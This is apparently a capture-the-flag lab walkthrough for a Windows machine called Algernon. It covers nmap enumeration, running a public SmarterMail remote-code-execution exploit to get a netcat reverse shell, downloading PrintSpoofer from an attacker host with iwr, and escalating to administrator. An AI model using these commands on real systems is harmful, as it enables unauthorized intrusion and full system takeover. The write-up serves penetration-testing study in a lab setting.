# 🪟 Algernon

> MultiChat / PrintSpoofer

### Enumerating Services
First, we'll perform a generic scan to identify the open ports and services running on this machine.
```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.182.37

PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-26-20  10:25PM       <DIR>          inetpub
9998/tcp  open  http               SimpleREST framework rest
| http-methods:
|_  Potentially risky methods: DELETE PUT
|_http-title: IceWarp Server  &lt;SmarterMail&gt;
17001/tcp open  remoting           MS .NET Remoting services
49664/tcp open  msrpc              Microsoft Windows RPC
49665/tcp open  msrpc              Microsoft Windows RPC
49666/tcp open  msrpc              Microsoft Windows RPC
49667/tcp open  msrpc              Microsoft Windows RPC
49668/tcp open  msrpc              Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
### Enumerating port 9998
On this port we found a web application: SmarterMail. After research, we found a public exploit for it.
```shell
# Exploit
searchsploit SmarterMail
SmarterMail < 16.x - Remote Code Execution         | windows/remote/49216.py

searchsploit -m 49216
```
### Initial Access
```shell
# Listener
rlwrap -cAra nc -vnlp 443

# Reverse Shell
python3 49216.py 192.168.182.37
```
### Privilege Escalation
We found the SeImpersonatePrivilege token enabled on the machine.
```shell
# Tokens
whoami /priv
SeImpersonatePrivilege        Impersonate a client after authentication  Enabled

# Transfer PrintSpoofer
iwr -uri http://192.168.45.242/PrintSpoofer64.exe -outfile PrintSpoofer64.exe

# Privilege Escalation
.\PrintSpoofer64.exe -i -c cmd
```
### Post-Exploitation
```shell
# Evidence
ipconfig

type C:\Users\Administrator\Desktop\proof.txt
```
